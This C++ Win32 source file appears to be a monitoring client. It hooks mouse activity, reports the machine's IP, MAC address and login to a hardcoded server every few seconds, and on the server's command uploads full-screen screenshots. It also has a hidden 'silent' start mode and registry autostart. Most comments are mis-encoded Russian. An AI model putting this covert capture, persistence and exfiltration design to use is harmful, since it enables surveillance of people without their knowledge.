#include "framework.h"
#include "CentavrClient.h"
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>  
#include <windowsx.h>  
#include <iostream>
#include <thread>
#include <chrono>
#include <atomic>
#include <winsock2.h>
#include <iphlpapi.h>
#include <locale>
#include <codecvt>
#include <string>
#include <vector>
#include <Wininet.h>
#include <fstream> 
#include <ws2tcpip.h>

#define MAX_LOADSTRING 100

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Ws2_32.lib")

using namespace std::chrono;

//Ãëîáàëüíûå ïåðåìåííûå
HINSTANCE hInst;                             
WCHAR szTitle[MAX_LOADSTRING];              
WCHAR szWindowClass[MAX_LOADSTRING];       
HWND hWndConnectButton;                   
HWND hWndOutputTextBox;                  
HBRUSH hRedBrush;
HWND hWndLoginIntputTextBox; 
HWND hWndIPIntputTextBox; 
bool isClicked = false;
bool isLoggedIn = false;
bool isThereAnError = false;
std::string nameToSend = "";
std::string ipToSend= "";
steady_clock::time_point lastMouseMoveTime = steady_clock::now();
HHOOK g_mouseHook = NULL;
bool silentMode = false;  // Default to false, assuming not in silent mode

//Ïðîòîòèïû
ATOM MyRegisterClass(HINSTANCE hInstance);
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow, bool silentMode);
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK NewWindowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
void SendHttpRequest(HWND hWnd);
void UpdateTextOutput(HWND hWnd, const std::string& text);
void ShowNotificationWindow(HWND hWndParent, const std::string& message);

//Äëÿ çàõâàòà êóðñîðà
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) {
        if (wParam == WM_MOUSEMOVE) {
            lastMouseMoveTime = steady_clock::now();
        }
    }
    return CallNextHookEx(g_mouseHook, nCode, wParam, lParam);
}

void SetGlobalMouseHook()
{
    g_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
    if (g_mouseHook == NULL) {
        MessageBoxW(NULL, L"Failed to set mouse hook", L"Error", MB_OK | MB_ICONERROR);
    }
}

void RemoveGlobalMouseHook()
{
    if (g_mouseHook != NULL) {
        UnhookWindowsHookEx(g_mouseHook);
        g_mouseHook = NULL;
    }
}

//Ïîëó÷åíèå àäðåñîâ
std::string GetMACAddress() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD buflen = sizeof(adapterInfo);

    if (GetAdaptersInfo(adapterInfo, &buflen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        char macAddr[18];
        sprintf_s(macAddr, "%02X-%02X-%02X-%02X-%02X-%02X",
            pAdapter->Address[0],
            pAdapter->Address[1],
            pAdapter->Address[2],
            pAdapter->Address[3],
            pAdapter->Address[4],
            pAdapter->Address[5]);

        return std::string(macAddr);
    }

    return "unknown";
}

std::string GetLocalIPAddress() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        return "unknown";
    }

    addrinfo hints = {};
    hints.ai_family = AF_INET; 
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo* result = nullptr;
    if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) {
        return "unknown";
    }

    char ipStr[INET_ADDRSTRLEN] = {};
    for (addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
        sockaddr_in* sockaddr_ipv4 = reinterpret_cast<sockaddr_in*>(ptr->ai_addr);
        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, sizeof(ipStr));
        break; 
    }

    freeaddrinfo(result);
    return std::string(ipStr);
}

void SendScreenshotToServer(HWND hWnd) {
    if (!isLoggedIn) return;
    if (isThereAnError) return;

    // Çàõâàò îêíà
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, nScreenWidth, nScreenHeight);
    SelectObject(hdcMemDC, hBitmap);
    BitBlt(hdcMemDC, 0, 0, nScreenWidth, nScreenHeight, hdcScreen, 0, 0, SRCCOPY);

    // Íàñòðîéêà áèòìàï â õåäåð (Èíà÷å íå áóäåò ïðàâèëüíî îòîáðàæàòñüÿ íà ñåðâåðå)
    BITMAPINFOHEADER biHeader = {};
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biWidth = nScreenWidth;
    biHeader.biHeight = -nScreenHeight; 
    biHeader.biPlanes = 1;
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;

    int rowSize = ((nScreenWidth * 3 + 3) & ~3); 
    biHeader.biSizeImage = rowSize * nScreenHeight;

    std::vector<BYTE> bitmapData(biHeader.biSizeImage);
    GetDIBits(hdcMemDC, hBitmap, 0, nScreenHeight, bitmapData.data(), (BITMAPINFO*)&biHeader, DIB_RGB_COLORS);

    BITMAPFILEHEADER bmfHeader;
    bmfHeader.bfType = 0x4D42; 
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + bitmapData.size();
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;

    std::vector<BYTE> fullBitmap(bmfHeader.bfSize);
    memcpy(fullBitmap.data(), &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(fullBitmap.data() + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));
    memcpy(fullBitmap.data() + bmfHeader.bfOffBits, bitmapData.data(), bitmapData.size());

    //Ñîõðàíåíèå íà êëèåíòå (äëÿ òåñòðîâàíèÿ)
    std::wstring filePath = L"screenshot_output.bmp";
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, fullBitmap.data(), fullBitmap.size(), &bytesWritten, NULL);
        CloseHandle(hFile);
        ShellExecuteW(NULL, L"open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    }

    //Îòïðàâêà íà ñåðâåð
    std::string ip = GetLocalIPAddress();
    std::string mac = GetMACAddress();
    std::string login = nameToSend;
    std::string serverip = ipToSend;
    //std::string fullUrl = "http://"+ serverip +"/CentavrServer/main.php/uploads?login=" + login;
    std::string fullUrl = "http://"+ serverip +"/main.php/uploads?login=" + login;

    HINTERNET hInternet = InternetOpenA("CentavrClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        MessageBoxW(hWnd, L"Íå óäàëîñü èíèöèàëèçèðîâàòü èíòåðíåò-ñîåäèíåíèå", L"Îøèáêà", MB_OK | MB_ICONERROR);
        return;
    }

    URL_COMPONENTSA urlComp = {};
    char host[256], path[1024];
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = sizeof(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = sizeof(path);
    InternetCrackUrlA(fullUrl.c_str(), 0, 0, &urlComp);

    HINTERNET hConnect = InternetConnectA(hInternet, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        MessageBoxW(hWnd, L"Îøèáêà ñîåäèíåíèÿ ñ õîñòîì", L"Îøèáêà", MB_OK | MB_ICONERROR);
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "PUT", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        MessageBoxW(hWnd, L"Îøèáêà ñîçäàíèÿ çàïðîñà", L"Îøèáêà", MB_OK | MB_ICONERROR);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    std::string headers = "Content-Type: application/octet-stream\r\n";
    BOOL bSent = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), fullBitmap.data(), fullBitmap.size());

    if (!bSent) {
        MessageBoxW(hWnd, L"Íå óäàëîñü îòïðàâèòü ñêðèíøîò", L"Îøèáêà", MB_OK | MB_ICONERROR);
    } else {
        MessageBoxW(hWnd, L"Ñêðèíøîò îòïðàâëåí íà ñåðâàê", L"Óñïåõ", MB_OK | MB_ICONINFORMATION);
    }

    // Î÷èñòêà
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    DeleteObject(hBitmap);
    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
}

void SendHttpRequest(HWND hWnd)
{
    if (isLoggedIn == false) return;

	if (isThereAnError == true) return;


    auto now = steady_clock::now();
    auto duration = duration_cast<seconds>(now - lastMouseMoveTime).count();
    if (duration > 1) {
        return;
    }

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

    HINTERNET hInternet, hConnect;
    DWORD dwBytesRead;
    DWORD dwTotalBytesRead = 0;
    DWORD dwBufferSize = 4096; 
    BYTE* buffer = new BYTE[dwBufferSize];

	std::string ip = GetLocalIPAddress();
	std::string mac = GetMACAddress();

	//std::string fullUrl = "http://" + ipToSend + "/CentavrServer/main.php?ip=" + ip + "&mac=" + mac +"&login=" + nameToSend;
	std::string fullUrl = "http://" + ipToSend + "/main.php?ip=" + ip + "&mac=" + mac +"&login=" + nameToSend;
	const char* url = fullUrl.c_str();


    hInternet = InternetOpenA("CentavrClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        isThereAnError = true;
        MessageBoxW(hWnd, L"Íå óäàëîñü èíèöèàëèçèðîâàòü èíòåðíåò-ñîåäèíåíèå", L"Îøèáêà", MB_OK | MB_ICONERROR);
        return;
    }

    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        isThereAnError = true;
        MessageBoxW(hWnd, L"Íå óäàëîñü ïîäêëþ÷èòüñÿ ê ñåðâåðó", L"Îøèáêà", MB_OK | MB_ICONERROR);
        InternetCloseHandle(hInternet);

        return;
    }

    while (InternetReadFile(hConnect, buffer, dwBufferSize, &dwBytesRead) && dwBytesRead > 0) {
        dwTotalBytesRead += dwBytesRead;
    }

    if (dwTotalBytesRead == 0) {
        isThereAnError = true;
        MessageBoxW(hWnd, L"Îòâåò îò ñåðâåðà íå ñîäåðæèò äàííûõ", L"Îøèáêà", MB_OK | MB_ICONERROR);
        delete[] buffer;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    std::string jsonResponse(reinterpret_cast<char*>(buffer), dwTotalBytesRead);

    delete[] buffer;
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    UpdateTextOutput(hWnd, jsonResponse);

    //ïàðñèíã äæåéñîíà, ÷òîáû ïîëó÷èòü çíà÷åíèå bool sendScreenShot
	std::string sendScreenShotValue;
	size_t keyPos = jsonResponse.find("\"sendScreenShot\"");
	if (keyPos != std::string::npos) {
		size_t colonPos = jsonResponse.find(":", keyPos);
		size_t quoteStart = jsonResponse.find("\"", colonPos);
		size_t quoteEnd = jsonResponse.find("\"", quoteStart + 1);
		if (quoteStart != std::string::npos && quoteEnd != std::string::npos) {
			sendScreenShotValue = jsonResponse.substr(quoteStart + 1, quoteEnd - quoteStart - 1);
		}
	}

    //åñëè òðó òî îòïðàâëÿåì ñêðèíøîò íà ñåðâåð
	if (sendScreenShotValue == "true") {
		ShowNotificationWindow(hWnd, sendScreenShotValue);
        SendScreenshotToServer(hWnd);
	}

}

//Ñîîáùåíèå îá îòïðàâêå ñêðèíøîòà
void ShowNotificationWindow(HWND hWndParent, const std::string& message)
{
    const wchar_t CLASS_NAME[] = L"NotificationWindow";

    std::wstring wMessage(message.begin(), message.end());

    static bool isClassRegistered = false;
    if (!isClassRegistered)
    {
        WNDCLASS wc = {};
        wc.lpfnWndProc = DefWindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = CLASS_NAME;
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        RegisterClass(&wc);
        isClassRegistered = true;
    }

    HWND hNotifyWnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
        CLASS_NAME,
        NULL,
        WS_POPUP,
        100, 100, 300, 100, 
        hWndParent,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );

    HWND hStatic = CreateWindow(
        L"STATIC",
        wMessage.c_str(),
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        10, 30, 280, 40,
        hNotifyWnd,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );




    ShowWindow(hNotifyWnd, SW_SHOWNOACTIVATE);
    UpdateWindow(hNotifyWnd);



    std::thread([hNotifyWnd]() {
        Sleep(1000);
        PostMessage(hNotifyWnd, WM_CLOSE, 0, 0);
    }).detach();
}


//Äîáàâëåíèå â àâòîçàïóñê
bool AddToStartup(const std::wstring& appName, const std::wstring& exePath)
{
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS) return false;

    result = RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ,
        (const BYTE*)exePath.c_str(), (exePath.size() + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// îáíîâëåíèå òåêñòà â òåêñò áîêñå
void UpdateTextOutput(HWND hWnd, const std::string& text)
{
    SetWindowTextA(hWndOutputTextBox, text.c_str() );
}

// ãëàâíàÿ ôóíêöèÿ
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_CENTAVRCLIENT, szWindowClass, MAX_LOADSTRING);

    MyRegisterClass(hInstance);

    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = NewWindowProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"MyPopupWindow";
    RegisterClassW(&wc);


	bool silentMode = false;
	HKEY hKey;
	DWORD value = 0;
	DWORD dataSize = sizeof(DWORD);

	if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\MyAppName", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		RegQueryValueExW(hKey, L"SilentStart", NULL, NULL, (LPBYTE)&value, &dataSize);
		RegCloseKey(hKey);
		silentMode = (value == 1);
	}


    if (!InitInstance(hInstance, nCmdShow, silentMode))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CENTAVRCLIENT));

    MSG msg;

    SetGlobalMouseHook();


    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    RemoveGlobalMouseHook();

    return (int) msg.wParam;
}

//ðåãèñòðàöèÿ ãëàâíîãî îêíà
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style          = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc    = WndProc;
	wcex.cbClsExtra     = 0;
	wcex.cbWndExtra     = 0;
	wcex.hInstance      = hInstance;
	wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_CENTAVRCLIENT));
	wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground  = (HBRUSH)(COLOR_BTNFACE + 1);  

	HBRUSH hBackgroundBrush = CreateSolidBrush(RGB(245, 245, 245)); 
	wcex.lpszMenuName   = nullptr;                      
	wcex.lpszClassName  = szWindowClass;
	wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

NOTIFYICONDATA nid = { 0 };

//ñîçäàåì âñå ñîäåðæàíèå ãëàâíîãî îêíà
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow, bool silentMode = false)
{
   hInst = hInstance; 

	int width = 400;
	int height = 400;
	DWORD style = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX;
	RECT rect = { 0, 0, width, height };
	AdjustWindowRect(&rect, style, FALSE);
	int adjustedWidth = rect.right - rect.left;
	int adjustedHeight = rect.bottom - rect.top;
	HWND hWnd = CreateWindowExW(
		0,
		szWindowClass,
		szTitle,
		style,
		CW_USEDEFAULT, CW_USEDEFAULT,
		adjustedWidth, adjustedHeight,
		nullptr,
		nullptr,
		hInstance,
		nullptr
	);

   if (!hWnd)
   {
      return FALSE;
   }

 
   HWND hWndConnectButton = CreateWindowW(
      L"BUTTON",  
      L"Connect", 
      WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 
      50, 185,  
      200, 30, 
      hWnd,    
      (HMENU)2,
      hInstance,  
      NULL
   );

   HWND hWndStartupButton = CreateWindowW(
      L"BUTTON",  
      L"Add to startup", 
      WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 
      50, 355,  
      200, 30, 
      hWnd,    
      (HMENU)4,
      hInstance,  
      NULL
   );

	HWND hWndLoginLabel = CreateWindowW(
		L"STATIC",             
		L"Login", 
		WS_VISIBLE | WS_CHILD, 
		50, 80,               
		200, 30,             
		hWnd,               
		(HMENU)3,          
		hInstance,        
		NULL
	);

	HWND hWndPasswordLabel = CreateWindowW(
		L"STATIC",            
		L"Password", 
		WS_VISIBLE | WS_CHILD,
		50, 130,             
		200, 30,            
		hWnd,              
		(HMENU)3,         
		hInstance,       
		NULL
	);

	HWND hWndOutputTextLabel = CreateWindowW(
		L"STATIC",      
		L"Output",
		WS_VISIBLE | WS_CHILD, 
		50, 220,              
		200, 30,             
		hWnd,               
		(HMENU)3,          
		hInstance,        
		NULL
	);

	HWND hWndAppTextLabel = CreateWindowW(
		L"STATIC",            
		L"IP of server",
		WS_VISIBLE | WS_CHILD,
		50,30,              
		200, 30,            
		hWnd,              
		(HMENU)3,         
		hInstance,       
		NULL
	);


	hWndIPIntputTextBox = CreateWindowExW(
		WS_EX_CLIENTEDGE,
		L"EDIT",
		L"195.133.194.94",
		//L"localhost/CentavrServer/",
		WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL,
		50, 50,
		300, 25,
		hWnd,
		(HMENU)1,
		hInstance,
		NULL
	);

	hWndLoginIntputTextBox = CreateWindowExW(
		WS_EX_CLIENTEDGE,
		L"EDIT",
		L"user",
		WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL,
		50, 100,
		300, 25,
		hWnd,
		(HMENU)1,
		hInstance,
		NULL
	);


   HWND hWndPasswordInputTextBox = CreateWindowExW(
    	WS_EX_CLIENTEDGE,           
      L"EDIT",    
      L"",       
      WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL,
      50, 150,   
      300, 25,  
      hWnd,    
      (HMENU)2,  
      hInstance,
      NULL
   );


	hWndOutputTextBox = CreateWindowExW(
		WS_EX_CLIENTEDGE,
		L"EDIT",
		L"",
		WS_VISIBLE | WS_CHILD | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL,
		50, 240,   
		300, 105,  
		hWnd,
		NULL,
		hInstance,
		NULL
	);

	HWND hWndSilentStartButton = CreateWindowW(
		L"BUTTON",
		L"Silent Start",
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
		255, 355,
		100, 30,
		hWnd,
		(HMENU)5,
		hInstance,
		NULL
	);




   if (!hWndConnectButton || !hWndOutputTextBox || !hWndLoginIntputTextBox)
   {
      return FALSE; 

   }

    if (!silentMode) {
        ShowWindow(hWnd, nCmdShow);
	   UpdateWindow(hWnd);
        //ShowWindow(hWnd, SW_HIDE); // ñêðûâàåì
    } else {
        ShowWindow(hWnd, SW_HIDE); // ñêðûâàåì
    }
    //!!!!!!!!!!!!!!!!!!!!!!!!РАСКОММЕНТИРУЙТЕ ЕСЛИ ХОТИТЕ ВЫКЛЮЧИТЬ НЕЗАМЕТНЫЙ РЕЖИМ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	//ShowWindow(hWnd, nCmdShow);
    //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


   UpdateWindow(hWnd);

   SendMessage(hWnd, WM_COMMAND, MAKEWPARAM(2, BN_CLICKED), (LPARAM)hWnd);

   return TRUE;
}

#define IDT_HTTP_TIMER 1  
#define TIMER_INTERVAL 2000 

//Îáðàáîòêà ñîîáùåíèé
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{

    static HBRUSH hbrNormal = CreateSolidBrush(RGB(255, 255, 255));
    static HBRUSH hbrPressed = CreateSolidBrush(RGB(0, 255, 0));
    static bool isPressed = false; 

	PAINTSTRUCT ps;
	HDC hdc = BeginPaint(hWnd, &ps);
	
	isClicked = false;

	HBRUSH hBrush = CreateSolidBrush(isClicked ? RGB(0, 255, 0) : RGB(255, 0, 0)); 
	RECT rect = { 250,185, 350, 215 }; 
	FillRect(hdc, &rect, hBrush);
	DeleteObject(hBrush);

	SetBkMode(hdc, TRANSPARENT);
	SetTextColor(hdc, RGB(0, 0, 0));

	const wchar_t* text = L"Not connected";
	DrawText(hdc, text, -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
	EndPaint(hWnd, &ps);

    switch (message)
    {

		case WM_CREATE:
			hRedBrush = CreateSolidBrush(RGB(255, 0, 0));  // Creating red brush
			
			// Set the timer
			SetTimer(hWnd, IDT_HTTP_TIMER, TIMER_INTERVAL, NULL);
			
			// Check the silentMode flag and control window visibility
			if (silentMode) {
				ShowWindow(hWnd, SW_HIDE);  // Hide window if silentMode is enabled
			} else {
				ShowWindow(hWnd, SW_SHOWNORMAL);  // Show window normally if silentMode is off
			}

			break;


		case WM_MOUSEMOVE:
			lastMouseMoveTime = steady_clock::now();
			break;


		case WM_DRAWITEM:
		{
			LPDRAWITEMSTRUCT lpDrawItem = (LPDRAWITEMSTRUCT)lParam;

			if (lpDrawItem->CtlID == 2) {
				SetBkColor(lpDrawItem->hDC, RGB(255, 0, 0));
				SetTextColor(lpDrawItem->hDC, RGB(255, 255, 255));
				FillRect(lpDrawItem->hDC, &lpDrawItem->rcItem, CreateSolidBrush(RGB(255, 0, 0)));

				DrawTextW(lpDrawItem->hDC, L"not logged in", -1, &lpDrawItem->rcItem,
						  DT_CENTER | DT_VCENTER | DT_SINGLELINE);
				return TRUE;
			}
		}
		break;
            

        case WM_TIMER:
            if (wParam == IDT_HTTP_TIMER) {
                SendHttpRequest(hWnd);
            }
            break;


        case WM_COMMAND:
        {

            if (LOWORD(wParam) == 2) {
                isPressed = !isPressed;
                InvalidateRect(hWnd, NULL, TRUE);  
            }


            int wmId = LOWORD(wParam);
            switch (wmId)
            {
                case IDM_EXIT:
                    DestroyWindow(hWnd);
                    break;
                case 1:
                    break;

                case 4: //Êíîïêà ñ ID 2 
                {
					wchar_t exePath[MAX_PATH];
					GetModuleFileNameW(NULL, exePath, MAX_PATH);  // Gets full path to your .exe

					bool success = AddToStartup(L"MyAutoStartApp", exePath);

					if (success) {
						MessageBoxW(NULL, L"App successfully added to startup!", L"Success", MB_OK);
					} else {
						MessageBoxW(NULL, L"Failed to add app to startup.", L"Error", MB_OK | MB_ICONERROR);
					}
				}

                break;

                case 5: 
                {

					HKEY hKey;
					if (RegCreateKeyExW(HKEY_CURRENT_USER,
						L"Software\\MyAppName",
						0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS)
					{
						DWORD value = 1;
						RegSetValueExW(hKey, L"SilentStart", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
						RegCloseKey(hKey);
						MessageBoxW(hWnd, L"Silent Start enabled. App will run hidden next time.", L"Info", MB_OK);
					}
					break;

                }

				case 2: //Êíîïêà ñ ID 2 
				{
                    isThereAnError = false;


					wchar_t buffer[100];
					GetWindowTextW(hWndLoginIntputTextBox, buffer, 100);

                    if (wcscmp(buffer, L"") != 0) 
                    {
                        isLoggedIn = true;

                        //Ðèñóåì çåëåíûé èíäèêàòîð connect ïðè óñïåøíîì ïîäêëþ÷åíèè
						{
							PAINTSTRUCT ps;
							HDC hdc = BeginPaint(hWnd, &ps);

							isClicked = true;

							HBRUSH hBrush = CreateSolidBrush(isClicked ? RGB(0, 255, 0) : RGB(255, 0, 0)); 

							RECT rect = { 250,185, 350, 215 };  
							FillRect(hdc, &rect, hBrush);
							DeleteObject(hBrush);

							SetBkMode(hdc, TRANSPARENT); 
							SetTextColor(hdc, RGB(0, 0, 0)); 

							const wchar_t* text = L"Connected";
							DrawText(hdc, text, -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

							EndPaint(hWnd, &ps);
						}

                        //Îïðåäåëÿåì ëîãèí, êîòîðûé îòïðàâèòñÿ â ñîîáùåíèè
                        {
							wchar_t loginbuffer[100];
							GetWindowTextW(hWndLoginIntputTextBox, loginbuffer, 100);

							std::wstring wlogin(loginbuffer);
							std::string login = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(wlogin);

                            nameToSend = login;

							wchar_t ipbuffer[100];
							GetWindowTextW(hWndIPIntputTextBox, ipbuffer, 100);

							std::wstring wip(ipbuffer);
							std::string ip = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(wip);

                            ipToSend = ip;

                        }

                    }
                    else {
                        isLoggedIn = false;
						MessageBoxW(hWnd, L"Access denied. Please enter you username.", L"Permission", MB_OK | MB_ICONWARNING);
                    }

					break;

				}

                default:
                    return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;

        case WM_CTLCOLORBTN: {
            HWND hButton = (HWND)lParam;
            if (isPressed) {
                SetBkColor((HDC)wParam, RGB(0, 255, 0));  
                SetTextColor((HDC)wParam, RGB(0, 0, 0)); 
                return (LRESULT)hbrPressed;  
            } else {
                SetBkColor((HDC)wParam, RGB(255, 255, 255)); 
                SetTextColor((HDC)wParam, RGB(0, 0, 0));  
                return (LRESULT)hbrNormal; 
            }
        }

        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            EndPaint(hWnd, &ps);
        }
        break;

        case WM_DESTROY:
            KillTimer(hWnd, IDT_HTTP_TIMER); 
			DeleteObject(hRedBrush);

            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

LRESULT CALLBACK PopupWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_CLOSE:
        DestroyWindow(hWnd);
        break;
    default:
        return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

LRESULT CALLBACK NewWindowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}
